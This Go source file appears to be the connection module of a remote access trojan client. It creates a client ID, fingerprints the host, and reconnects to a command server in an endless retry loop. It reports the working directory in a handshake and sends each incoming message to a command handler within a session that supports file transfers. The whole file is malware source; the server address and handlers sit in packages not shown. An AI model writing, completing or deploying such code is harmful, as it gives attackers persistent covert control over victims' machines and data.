package connection

import (
	"log"
	"time"

	"client-go/executor"
	"client-go/handler"
	"client-go/protocol"
)

type Client struct {
	clientID string
	identity hostIdentity
}

func New() *Client {
	return &Client{clientID: executor.NewClientID(), identity: detectHostIdentity()}
}

func (c *Client) Run() {
	for {
		conn, err := dialServer()
		if err != nil {
			log.Printf("RCH connection failed: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}

		sock := protocol.NewRATSocket(conn)
		session := executor.NewSession(sock, c.clientID)

		_ = sock.Send(c.buildHandshake(session.Cwd))

		for {
			msg, err := sock.Recv()
			if err != nil {
				session.CloseTransfers()
				_ = conn.Close()
				break
			}

			handler.Handle(session, msg)
		}
	}
}
